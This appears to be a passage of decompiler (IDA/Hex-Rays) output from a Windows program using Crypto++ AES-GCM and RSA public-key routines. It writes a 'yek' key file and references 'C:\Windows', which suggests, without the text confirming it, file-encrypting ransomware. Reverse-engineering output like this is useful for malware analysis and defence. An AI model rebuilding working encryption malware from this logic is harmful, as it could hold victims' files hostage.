      if ( v127 >= 0x1000 )
      {
        v127 = 2 * v98 + 37;
        v45 = *(void **)(v97[0] - 4);
        if ( (unsigned int)(v97[0] - (_DWORD)v45 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v45);
    }
    v97[4] = 0;
    v98 = 7;
    LOWORD(v97[0]) = 0;
    memset(v109, 0, sizeof(v109));
    sub_419E50(v109, (int)v135, 32, v81, v87);
    LOBYTE(v145) = 19;
    memset(v112, 0, sizeof(v112));
    v46 = (wchar_t *)&a5;
    if ( a10 >= 8 )
      v46 = a5;
    sub_419CB0(v112, v46, v78, v82, v88);
    LOBYTE(v145) = 20;
    v120 = 0i64;
    v121 = 0;
    v48 = v135;
    if ( v136 >= 8 )
      v48 = (_DWORD *)v135[0];
    sub_407C40(&v120, (int)v48, v47);
    LOBYTE(v145) = 21;
    memset(v113, 0, sizeof(v113));
    v49 = operator new(0xE4u);
    v106 = v49;
    LOBYTE(v145) = 22;
    memset(v49, 0, 0xE4u);
    v50 = operator new(0x14u);
    v107 = v50;
    LOBYTE(v145) = 23;
    *(_OWORD *)v50 = 0i64;
    v50[4] = 0;
    v51 = v135;
    if ( v136 >= 8 )
      v51 = (_DWORD *)v135[0];
    v52 = sub_407C40(v50, (int)v51, v89);
    LOBYTE(v145) = 22;
    v53 = sub_452530(v49, (int)v110, (int)v52, 0, -1, &dword_4EEDC0, 5);
    LOBYTE(v145) = 21;
    v54 = (int *)&a5;
    if ( a10 >= 8 )
      v54 = (int *)a5;
    sub_407AB0(v113, (int)v54, (int)v54, (int)v53, (int)v54);
    LOBYTE(v145) = 24;
    sub_419E10(v109);
    if ( !sub_41F310((int)&v112[6]) )
      sub_4036A0(
        (_DWORD *)((char *)v112 + *(_DWORD *)(v112[0] + 4)),
        *((_BYTE *)&v112[3] + *(_DWORD *)(v112[0] + 4)) | (4
                                                         * (*(_DWORD *)((char *)&v112[14] + *(_DWORD *)(v112[0] + 4)) == 0)
                                                         + 2),
        0);
    memset(v111, 0, sizeof(v111));
    v55 = (wchar_t *)&a5;
    if ( a10 >= 8 )
      v55 = a5;
    sub_419ED0(v111, v55, 2, v83, v90);
    LOBYTE(v145) = 25;
    sub_41AB40((int)v111, (int)v146, v56);
    sub_419E10(v111);
    memset(v138, 0, sizeof(v138));
    *(_OWORD *)v138 = v137[0];
    *(_OWORD *)&v138[16] = v137[1];
    *(_QWORD *)&v138[32] = v139;
    *(_DWORD *)&v138[40] = v140;
    *(_DWORD *)&v138[44] = *(_DWORD *)a1;
    v138[48] = *(_BYTE *)(a1 + 4);
    sub_419B80((int)v122, "                                                 ");
    LOBYTE(v145) = 26;
    for ( i = 0; ; ++i )
    {
      v105 = i;
      if ( i >= 49 )
        break;
      v58 = v122;
      if ( v123 >= 0x10 )
        v58 = (_DWORD *)v122[0];
      *((_BYTE *)v58 + i) = v138[i];
    }
    memset(v118, 0, sizeof(v118));
    sub_40A110(v118, 1);
    LOBYTE(v145) = 27;
    memset(v119, 0, sizeof(v119));
    v59 = operator new(0x3Cu);
    v107 = v59;
    LOBYTE(v145) = 28;
    memset(v59, 0, 0x3Cu);
    v60 = sub_409010(v59, v91);
    LOBYTE(v145) = 27;
    sub_4072D0(v119, &a11, v61, (int)v60);
    LOBYTE(v145) = 29;
    sub_433390(&v118[1], v119);
    memset(v114, 0, sizeof(v114));
    sub_407610(v114, v84, v92);
    LOBYTE(v145) = 30;
    memset(v116, 0, 0x4Cu);
    sub_417630(v116, (int)&v118[2] + *(_DWORD *)(v118[2] + 4));
    v133 = 0;
    v134 = 15;
    LOBYTE(v132[0]) = 0;
    LOBYTE(v145) = 32;
    memset(v117, 0, sizeof(v117));
    v62 = operator new(0x4Cu);
    v107 = v62;
    LOBYTE(v145) = 33;
    memset(v62, 0, 0x4Cu);
    v63 = operator new(0x10u);
    v106 = v63;
    LOBYTE(v145) = 34;
    *(_OWORD *)v63 = 0i64;
    v64 = sub_4187A0(v63, (int)v132);
    LOBYTE(v145) = 33;
    v65 = sub_407080(v62, (int)v114, (int)v116, (int)v64);
    LOBYTE(v145) = 32;
    sub_4072D0(v117, v122, v66, (int)v65);
    LOBYTE(v145) = 35;
    memset(v108, 0, sizeof(v108));
    v67 = (wchar_t *)v135;
    if ( v136 >= 8 )
      v67 = (wchar_t *)v135[0];
    sub_41B100(v108, v67, v79, v85, v93);
    LOBYTE(v145) = 36;
    if ( !*(FILE **)((char *)&v108[3] + v108[0]->_cnt) )
    {
      sub_41C1D0((int *)v108, (int)"yek", 3i64);
      v68 = v132;
      if ( v134 >= 0x10 )
        v68 = (_DWORD *)v132[0];
      sub_41C1D0((int *)v108, (int)v68, v133);
      sub_41B090(v108);
    }
    LOBYTE(v145) = 35;
    sub_40A280((char *)v108);
    v117[0] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
    v117[1] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
    LOBYTE(v145) = 32;
    if ( v117[3] )
      (**(void (__thiscall ***)(_DWORD, int))v117[3])(v117[3], 1);
    LOBYTE(v145) = 31;
    if ( v134 >= 0x10 )
    {
      v126 = v134 + 1;
      v69 = (void *)v132[0];
      if ( v134 + 1 >= 0x1000 )
      {
        v126 = v134 + 36;
        v69 = *(void **)(v132[0] - 4);
        if ( (unsigned int)(v132[0] - (_DWORD)v69 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v69);
    }
    v133 = 0;
    v134 = 15;
    LOBYTE(v132[0]) = 0;
    LOBYTE(v145) = 30;
    sub_40A6C0(&v116[3]);
    v107 = &v116[18];
    v116[18] = &CryptoPP::NameValuePairs::`vftable';
    v114[0] = &CryptoPP::AutoSeededRandomPool::`vftable';
    LOBYTE(v145) = 29;
    sub_4076F0((int)v114);
    v119[0] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
    v119[1] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
    LOBYTE(v145) = 27;
    if ( v119[3] )
      (**(void (__thiscall ***)(_DWORD, int))v119[3])(v119[3], 1);
    LOBYTE(v145) = 26;
    sub_40A1D0(v118);
    LOBYTE(v145) = 25;
    if ( v123 >= 0x10 )
    {
      v125 = v123 + 1;
      v70 = (void *)v122[0];
      if ( v123 + 1 >= 0x1000 )
      {
        v125 = v123 + 36;
        v70 = *(void **)(v122[0] - 4);
        if ( (unsigned int)(v122[0] - (_DWORD)v70 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v70);
    }
    v122[4] = 0;
    v123 = 15;
    LOBYTE(v122[0]) = 0;
    LOBYTE(v145) = 24;
    sub_409FC0(v111);
    LOBYTE(v145) = 21;
    sub_4181B0(v113);
    LOBYTE(v145) = 20;
    if ( HIDWORD(v120) )
      (**(void (__thiscall ***)(int, int))(*(_DWORD *)(*(_DWORD *)HIDWORD(v120) + 4) + HIDWORD(v120)))(
        *(_DWORD *)(*(_DWORD *)HIDWORD(v120) + 4) + HIDWORD(v120),
        1);
    LOBYTE(v145) = 19;
    sub_40A070(v112);
    LOBYTE(v145) = 18;
    sub_409FC0(v109);
    LOBYTE(v145) = 7;
    if ( v136 >= 8 )
    {
      v124 = 2 * v136 + 2;
      v71 = (void *)v135[0];
      if ( v124 >= 0x1000 )
      {
        v124 = 2 * v136 + 37;
        v71 = *(void **)(v135[0] - 4);
        if ( (unsigned int)(v135[0] - (_DWORD)v71 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v71);
    }
    v135[4] = 0;
    v136 = 7;
    LOWORD(v135[0]) = 0;
    LOBYTE(v145) = 6;
    sub_409F50(v110);
    v115[0] = (int)&CryptoPP::AutoSeededRandomPool::`vftable';
    LOBYTE(v145) = 5;
    sub_4076F0((int)v115);
  }
  v145 = 3;
  if ( a10 >= 8 )
  {
    v72 = a5;
    if ( 2 * a10 + 2 >= 0x1000 )
    {
      v72 = (wchar_t *)*((_DWORD *)a5 - 1);
      if ( (unsigned int)((char *)a5 - (char *)v72 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v72);
  }
  a9 = 0;
  a10 = 7;
  LOWORD(a5) = 0;
  LOBYTE(v145) = 2;
  if ( a16 >= 0x10 )
  {
    v73 = a11;
    if ( a16 + 1 >= 0x1000 )
    {
      v73 = (_BYTE *)*((_DWORD *)a11 - 1);
      if ( (unsigned int)(a11 - v73 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v73);
  }
  a15 = 0;
  a16 = 15;
  LOBYTE(a11) = 0;
  LOBYTE(v145) = 1;
  if ( a22 >= 8 )
  {
    v74 = a17;
    if ( 2 * a22 + 2 >= 0x1000 )
    {
      v74 = (_BYTE *)*((_DWORD *)a17 - 1);
      if ( (unsigned int)(a17 - v74 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v74);
  }
  a21 = 0;
  a22 = 7;
  LOWORD(a17) = 0;
  LOBYTE(v145) = 0;
  if ( a28 >= 8 )
  {
    v75 = a23;
    if ( 2 * a28 + 2 >= 0x1000 )
    {
      v75 = (_BYTE *)*((_DWORD *)a23 - 1);
      if ( (unsigned int)(a23 - v75 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v75);
  }
  a27 = 0;
  a28 = 7;
  LOWORD(a23) = 0;
  v145 = -1;
  if ( a34 >= 8 )
  {
    v76 = a29;
    if ( 2 * a34 + 2 >= 0x1000 )
    {
      v76 = (_BYTE *)*((_DWORD *)a29 - 1);
      if ( (unsigned int)(a29 - v76 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v76);
  }
  a33 = 0;
  a34 = 7;
  result = 0;
  LOWORD(a29) = 0;
  return result;
}
// 409110: could not find valid save-restore pair for ebp
// 409110: could not find valid save-restore pair for edi
// 409110: could not find valid save-restore pair for esi
// 409182: variable 'v35' is possibly undefined
// 4091AC: variable 'v80' is possibly undefined
// 4091AC: variable 'v86' is possibly undefined
// 4094E8: variable 'v81' is possibly undefined
// 4094E8: variable 'v87' is possibly undefined
// 409516: variable 'v78' is possibly undefined
// 409516: variable 'v82' is possibly undefined
// 409516: variable 'v88' is possibly undefined
// 40954C: variable 'v47' is possibly undefined
// 4095C3: variable 'v89' is possibly undefined
// 409677: variable 'v83' is possibly undefined
// 409677: variable 'v90' is possibly undefined
// 409687: variable 'v56' is possibly undefined
// 40976D: variable 'v91' is possibly undefined
// 409782: variable 'v61' is possibly undefined
// 4097B9: variable 'v84' is possibly undefined
// 4097B9: variable 'v92' is possibly undefined
// 4098B4: variable 'v66' is possibly undefined
// 4098E8: variable 'v79' is possibly undefined
// 4098E8: variable 'v85' is possibly undefined
// 4098E8: variable 'v93' is possibly undefined
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4BA718: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
// 4BA7EC: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
// 4CD0C0: using guessed type wchar_t aCWindows[11];
// 4CD0D8: using guessed type wchar_t aCWindows_0[13];
// 4CD0F4: using guessed type wchar_t asc_4CD0F4[2];
// 4CD0F8: using guessed type wchar_t aId[6];
// 4CD104: using guessed type wchar_t asc_4CD104[3];
// 4CFA9C: using guessed type void *CryptoPP::AutoSeededRandomPool::`vftable';
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (00409E80) --------------------------------------------------------
_DWORD *__thiscall sub_409E80(_DWORD *this)
{
  sub_40A3B0(this);
  *this = &CryptoPP::GCM_Final<CryptoPP::Rijndael,0,1>::`vftable';
  this[1] = &CryptoPP::GCM_Final<CryptoPP::Rijndael,0,1>::`vftable';
  this[2] = &CryptoPP::GCM_Final<CryptoPP::Rijndael,0,1>::`vftable';
  sub_435E90(this + 37, 1);
  this[41] = 0x3FFFFFFF;
  this[42] = 0;
  this[43] = sub_41E7A0(0, 0);
  this[45] = -1;
  this[46] = 0;
  this[47] = 0;
  this[36] = &off_4BAC30;
  this[37] = &off_4BAC70;
  return this;
}
// 4BAC30: using guessed type int (__stdcall *off_4BAC30)(int);
// 4BAC70: using guessed type void *off_4BAC70;
// 4CF7B4: using guessed type void *CryptoPP::GCM_Final<CryptoPP::Rijndael,0,1>::`vftable';
// 4CF7F8: using guessed type void *CryptoPP::GCM_Final<CryptoPP::Rijndael,0,1>::`vftable';
// 4CFAD0: using guessed type void *CryptoPP::GCM_Final<CryptoPP::Rijndael,0,1>::`vftable';

//----- (00409F50) --------------------------------------------------------
void __thiscall sub_409F50(_DWORD *this)
{
  sub_40AA00(this + 36);
  sub_40A540(this);
}

//----- (00409FC0) --------------------------------------------------------
void __thiscall sub_409FC0(_DWORD *this)
{
  struct std::ios_base *v1; // esi

  v1 = (struct std::ios_base *)(this + 26);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*this + 4) - 104) = &std::wofstream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*this + 4) - 108) = *(_DWORD *)(*this + 4) - 104;
  sub_41A9E0(this + 1);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 104) = &std::wostream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 108) = *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 8;
  *(_DWORD *)v1 = &std::wios::`vftable';
  *(_DWORD *)v1 = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4BD5FC: using guessed type void *std::wios::`vftable';
// 4BD604: using guessed type void *std::wostream::`vftable';
// 4CF7AC: using guessed type void *std::wofstream::`vftable';

//----- (0040A070) --------------------------------------------------------
void __thiscall sub_40A070(_DWORD *this)
{
  struct std::ios_base *v1; // esi

  v1 = (struct std::ios_base *)(this + 30);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*this + 4) - 120) = &std::wfstream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*this + 4) - 124) = *(_DWORD *)(*this + 4) - 120;
  sub_41A9E0(this + 6);
  sub_41AAA0((_DWORD *)v1 - 22);
  *(_DWORD *)v1 = &std::wios::`vftable';
  *(_DWORD *)v1 = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4BD5FC: using guessed type void *std::wios::`vftable';
// 4CF974: using guessed type void *std::wfstream::`vftable';

//----- (0040A110) --------------------------------------------------------
_DWORD *__thiscall sub_40A110(_DWORD *this, int a2)
{
  int v3; // eax
  int v4; // eax

  if ( a2 )
  {
    this[2] = &unk_4CD254;
    this[15] = &CryptoPP::NameValuePairs::`vftable';
  }
  v3 = this[2];
  this[1] = &CryptoPP::X509PublicKey::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(v3 + 4) + 8) = &CryptoPP::X509PublicKey::`vftable';
  v4 = this[2];
  *this = &CryptoPP::RSAFunction::`vftable';
  this[1] = &CryptoPP::RSAFunction::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(v4 + 4) + 8) = &CryptoPP::RSAFunction::`vftable';
  sub_43D6C0(this + 3);
  sub_43D6C0(this + 9);
  return this;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4BA8E0: using guessed type void *CryptoPP::X509PublicKey::`vftable';
// 4BA908: using guessed type void *CryptoPP::X509PublicKey::`vftable';
// 4BB0C0: using guessed type void *CryptoPP::RSAFunction::`vftable';
// 4BB0E4: using guessed type void *CryptoPP::RSAFunction::`vftable';
// 4BB10C: using guessed type void *CryptoPP::RSAFunction::`vftable';

//----- (0040A1D0) --------------------------------------------------------
int __thiscall sub_40A1D0(_DWORD *this)
{
  int result; // eax

  result = sub_40A6C0(this);
  this[15] = &CryptoPP::NameValuePairs::`vftable';
  return result;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (0040A220) --------------------------------------------------------
int __thiscall sub_40A220(_DWORD *this)
{
  _DWORD *v1; // esi
  int result; // eax

  v1 = this + 3;
  result = sub_40A6C0(this + 3);
  v1[15] = &CryptoPP::NameValuePairs::`vftable';
  return result;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (0040A280) --------------------------------------------------------
void __thiscall sub_40A280(char *this)
{
  struct std::ios_base *v1; // esi

  v1 = (struct std::ios_base *)(this + 104);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*(_DWORD *)this + 4) - 104) = &std::ofstream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*(_DWORD *)this + 4) - 108) = *(_DWORD *)(*(_DWORD *)this + 4) - 104;
  sub_41C100((int)(this + 4));
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 104) = &std::ostream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 108) = *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 8;
  *(_DWORD *)v1 = &std::ios::`vftable';
  *(_DWORD *)v1 = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 46A3A4: using guessed type void __cdecl std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4B8574: using guessed type void *std::ios::`vftable';
// 4B857C: using guessed type void *std::ostream::`vftable';
// 4BBFB8: using guessed type void *std::ofstream::`vftable';

//----- (0040A330) --------------------------------------------------------
_DWORD *__thiscall sub_40A330(_DWORD *this, char a2)
{
  sub_40AA00(this + 36);
  sub_40A540(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0040A3B0) --------------------------------------------------------
_DWORD *__thiscall sub_40A3B0(_DWORD *this)
{
  sub_435E90(this + 1, 1);
  sub_435E90(this + 2, 1);
  this[4] = -1;
  this[5] = 0;
  this[6] = 0;
  this[8] = 0;
  this[9] = 0;
  this[10] = 0;
  this[11] = 0;
  this[12] = 0;
  this[13] = 0;
  this[14] = 0;
  this[15] = 0;
  sub_435E90(this + 17, 1);
  this[18] = 0;
  this[20] = -1;
  this[21] = 0;
  this[22] = 0;
  this[25] = -1;
  this[26] = 0;
  this[27] = 0;
  sub_435E90(this + 28, 1);
  this[30] = -1;
  this[31] = 0;
  this[32] = 0;
  this[33] = 0;
  this[16] = &off_4BA264;
  this[17] = &off_4BA2B8;
  this[23] = &off_4BA2FC;
  this[28] = &off_4BA334;
  this[16] = &off_4BA368;
  this[17] = &off_4BA3BC;
  this[23] = &off_4BA400;
  this[28] = &off_4BA438;
  this[16] = &off_4CF910;
  this[17] = &off_4CF888;
  this[23] = &off_4CF97C;
  this[28] = &off_4CF768;
  return this;
}
// 4BA264: using guessed type int (__stdcall *off_4BA264)(int);
// 4BA2B8: using guessed type void *off_4BA2B8;
// 4BA2FC: using guessed type void *off_4BA2FC;
// 4BA334: using guessed type void *off_4BA334;
// 4BA368: using guessed type int (__stdcall *off_4BA368)(int);
// 4BA3BC: using guessed type void *off_4BA3BC;
// 4BA400: using guessed type void *off_4BA400;
// 4BA438: using guessed type void *off_4BA438;
// 4CF768: using guessed type void *off_4CF768;
// 4CF888: using guessed type void *off_4CF888;
// 4CF910: using guessed type int (__stdcall *off_4CF910)(int);
// 4CF97C: using guessed type void *off_4CF97C;

//----- (0040A540) --------------------------------------------------------
void __thiscall sub_40A540(_DWORD *this)
{
  unsigned int v2; // eax
  unsigned int v3; // edx
  void *v4; // esi

  this[16] = &off_4BA264;
  this[17] = &off_4BA2B8;
  this[23] = &off_4BA2FC;
  this[28] = &off_4BA334;
  sub_417E70((int)(this + 16));
  v2 = this[4];
  v3 = this[5];
  v4 = (void *)this[6];
  if ( v2 < v3 )
    v3 = v2;
  memset(v4, 0, v3);
  if ( v3 )
    j_j_unknown_libname_61(v4);
  else
    j_j___free_base(v4);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BA264: using guessed type int (__stdcall *off_4BA264)(int);
// 4BA2B8: using guessed type void *off_4BA2B8;
// 4BA2FC: using guessed type void *off_4BA2FC;
// 4BA334: using guessed type void *off_4BA334;

//----- (0040A600) --------------------------------------------------------
void __thiscall sub_40A600(_DWORD *this)
{
  sub_40AA00(this);
}

//----- (0040A650) --------------------------------------------------------
_DWORD *__thiscall sub_40A650(_DWORD *this, char a2)
{
  sub_40A6C0(this);
  this[15] = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (0040A6C0) --------------------------------------------------------
int __thiscall sub_40A6C0(_DWORD *this)
{
  _DWORD *v2; // ecx
  int v3; // edx
  int v4; // edx
  int v5; // eax
  int result; // eax
  void *v7; // [esp-4h] [ebp-28h]
  void *v8; // [esp-4h] [ebp-28h]

  v2 = this + 10;
  v7 = (void *)v2[3];
  v3 = *(_DWORD *)((char *)v2 + (v2[1] < v2[2] ? 0xFFFFFFFC : 0) + 8);
  memset(v7, 0, 4 * v3);
  if ( v3 )
    j_j_unknown_libname_61(v7);
  else
    j_j___free_base(v7);
  v8 = (void *)this[7];
  v4 = *(_DWORD *)((char *)this + (this[5] < this[6] ? 0xFFFFFFFC : 0) + 24);
  memset(v8, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v8);
  else
    j_j___free_base(v8);
  v5 = this[2];
  this[1] = &CryptoPP::X509PublicKey::`vftable';
  result = *(_DWORD *)(v5 + 4);
  *(_DWORD *)((char *)this + result + 8) = &CryptoPP::X509PublicKey::`vftable';
  return result;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4BA8E0: using guessed type void *CryptoPP::X509PublicKey::`vftable';
// 4BA908: using guessed type void *CryptoPP::X509PublicKey::`vftable';

//----- (0040A7A0) --------------------------------------------------------
int __thiscall sub_40A7A0(_DWORD *this)
{
  _DWORD *v1; // esi
  int result; // eax

  v1 = this + 3;
  result = sub_40A6C0(this + 3);
  v1[15] = &CryptoPP::NameValuePairs::`vftable';
  return result;
}
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (0040A800) --------------------------------------------------------
void __thiscall sub_40A800(_DWORD *this)
{
  *this = &off_4BA264;
  this[1] = &off_4BA2B8;
  this[7] = &off_4BA2FC;
  this[12] = &off_4BA334;
  sub_417E70((int)this);
}
// 4BA264: using guessed type int (__stdcall *off_4BA264)(int);
// 4BA2B8: using guessed type void *off_4BA2B8;
// 4BA2FC: using guessed type void *off_4BA2FC;
// 4BA334: using guessed type void *off_4BA334;

//----- (0040A870) --------------------------------------------------------
void __thiscall sub_40A870(_DWORD *this)
{
  sub_40AA00(this);
}

//----- (0040A8C0) --------------------------------------------------------
_DWORD *__thiscall sub_40A8C0(_DWORD *this, char a2)
{
  *this = &off_4BA264;
  this[1] = &off_4BA2B8;
  this[7] = &off_4BA2FC;
  this[12] = &off_4BA334;
  sub_417E70((int)this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4BA264: using guessed type int (__stdcall *off_4BA264)(int);
// 4BA2B8: using guessed type void *off_4BA2B8;
// 4BA2FC: using guessed type void *off_4BA2FC;
// 4BA334: using guessed type void *off_4BA334;

//----- (0040A940) --------------------------------------------------------
void __thiscall sub_40A940(_DWORD *this)
{
  *this = &off_4BA264;
  this[1] = &off_4BA2B8;
  this[7] = &off_4BA2FC;
  this[12] = &off_4BA334;
  sub_417E70((int)this);
}
// 4BA264: using guessed type int (__stdcall *off_4BA264)(int);
// 4BA2B8: using guessed type void *off_4BA2B8;
// 4BA2FC: using guessed type void *off_4BA2FC;
// 4BA334: using guessed type void *off_4BA334;

//----- (0040A9B0) --------------------------------------------------------
void __thiscall sub_40A9B0(_DWORD *this)
{
  sub_40AA00(this);
}

//----- (0040AA00) --------------------------------------------------------
void __thiscall sub_40AA00(_DWORD *this)
{
  unsigned int v2; // edx
  void *v3; // esi
  void *v4; // [esp-4h] [ebp-20h]

  v4 = (void *)this[11];
  memset(v4, 0, *(_DWORD *)((char *)this + (this[9] < this[10] ? 4 : 8) + 32));
  j_j___free_base(v4);
  v2 = this[6];
  if ( this[5] < v2 )
    v2 = this[5];
  v3 = (void *)this[7];
  memset(v3, 0, 4 * v2);
  if ( v2 )
    j_j_unknown_libname_61(v3);
  else
    j_j___free_base(v3);
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);

//----- (0040AAB0) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __usercall sub_40AAB0@<eax>(
        int a1@<ecx>,
        int a2@<ebp>,
        wchar_t *a3,
        int a4,
        int a5,
        int a6,
        int a7,
        unsigned int a8,
        _BYTE *a9,
        int a10,
        int a11,
        int a12,
        int a13,
        unsigned int a14,
        _BYTE *a15,
        int a16,
        int a17,
        int a18,
        int a19,
        unsigned int a20,
        _BYTE *a21,
        int a22,
        int a23,
        int a24,
        int a25,
        unsigned int a26,
        int a27,
        int a28,
        _BYTE *a29,
        int a30,
        int a31,
        int a32,
        int a33,
        unsigned int a34)
{
  void *v34; // esp
  const wchar_t *v36; // eax
  FILE *v37; // esi
  int i; // edx
  _DWORD *v39; // eax
  _DWORD *v40; // esi
  _DWORD *v41; // eax
  int v42; // ecx
  _DWORD *v43; // esi
  _DWORD *v44; // eax
  _DWORD *v45; // eax
  _DWORD *v46; // eax
  int v47; // ecx
  wchar_t *v48; // eax
  _DWORD *v49; // eax
  int v50; // eax
  int v51; // eax
  int v52; // eax
  int v53; // eax
  int v54; // eax
  void *v55; // edx
  void *v56; // edx
  void *v57; // edx
  void *v58; // edx
  void *v59; // edx
  const wchar_t *v60; // ecx
  const wchar_t *v61; // eax
  void *v62; // edx
  void *v63; // edx
  void *v64; // edx
  wchar_t *v65; // ecx
  _BYTE *v66; // ecx
  _BYTE *v67; // ecx
  _BYTE *v68; // ecx
  _BYTE *v69; // ecx
  int result; // eax
  int v71; // [esp-C39FCh] [ebp-C3A08h]
  int v72; // [esp-C39F8h] [ebp-C3A04h]
  int v73; // [esp-C39F8h] [ebp-C3A04h]
  int v74; // [esp-C39F8h] [ebp-C3A04h]
  int v75; // [esp-C39F4h] [ebp-C3A00h]
  int v76; // [esp-C39F4h] [ebp-C3A00h]
  int v77; // [esp-C39F4h] [ebp-C3A00h]
  int v78; // [esp-C39F4h] [ebp-C3A00h]
  int v79; // [esp-C39F0h] [ebp-C39FCh] BYREF
  _DWORD v80[5]; // [esp-C39E4h] [ebp-C39F0h] BYREF
  unsigned int v81; // [esp-C39D0h] [ebp-C39DCh]
  _DWORD v82[5]; // [esp-C39CCh] [ebp-C39D8h] BYREF
  unsigned int v83; // [esp-C39B8h] [ebp-C39C4h]
  _DWORD v84[5]; // [esp-C39B4h] [ebp-C39C0h] BYREF
  unsigned int v85; // [esp-C39A0h] [ebp-C39ACh]
  _DWORD v86[5]; // [esp-C399Ch] [ebp-C39A8h] BYREF
  unsigned int v87; // [esp-C3988h] [ebp-C3994h]
  _DWORD v88[5]; // [esp-C397Ch] [ebp-C3988h] BYREF
  unsigned int v89; // [esp-C3968h] [ebp-C3974h]
  int v90; // [esp-C3964h] [ebp-C3970h]
  _DWORD *v91; // [esp-C3960h] [ebp-C396Ch]
  _DWORD *v92; // [esp-C395Ch] [ebp-C3968h]
  FILE *v93[44]; // [esp-C3958h] [ebp-C3964h] BYREF
  int v94[48]; // [esp-C38A8h] [ebp-C38B4h] BYREF
  _DWORD v95[32]; // [esp-C37E8h] [ebp-C37F4h] BYREF
  int v96[32]; // [esp-C3768h] [ebp-C3774h] BYREF
  _DWORD v97[20]; // [esp-C36E8h] [ebp-C36F4h] BYREF
  _DWORD v98[14]; // [esp-C3698h] [ebp-C36A4h] BYREF
  int v99[16]; // [esp-C3660h] [ebp-C366Ch] BYREF
  _DWORD v100[14]; // [esp-C3620h] [ebp-C362Ch] BYREF
  _DWORD v101[5]; // [esp-C35E8h] [ebp-C35F4h] BYREF
  unsigned int v102; // [esp-C35D4h] [ebp-C35E0h]
  _DWORD v103[5]; // [esp-C35D0h] [ebp-C35DCh] BYREF
  unsigned int v104; // [esp-C35BCh] [ebp-C35C8h]
  unsigned int v105; // [esp-C35B8h] [ebp-C35C4h]
  unsigned int v106; // [esp-C35B4h] [ebp-C35C0h]
  unsigned int v107; // [esp-C35B0h] [ebp-C35BCh]
  unsigned int v108; // [esp-C35ACh] [ebp-C35B8h]
  unsigned int v109; // [esp-C35A8h] [ebp-C35B4h]
  unsigned int v110; // [esp-C35A4h] [ebp-C35B0h]
  unsigned int v111; // [esp-C35A0h] [ebp-C35ACh]
  unsigned int v112; // [esp-C359Ch] [ebp-C35A8h]
  _DWORD v113[4]; // [esp-C3598h] [ebp-C35A4h] BYREF
  unsigned int v114; // [esp-C3588h] [ebp-C3594h]
  unsigned int v115; // [esp-C3584h] [ebp-C3590h]
  char v116[400000]; // [esp-C3580h] [ebp-C358Ch] BYREF
  char v117[400004]; // [esp-61B00h] [ebp-61B0Ch] BYREF
  _OWORD v118[2]; // [esp-7Ch] [ebp-88h] BYREF
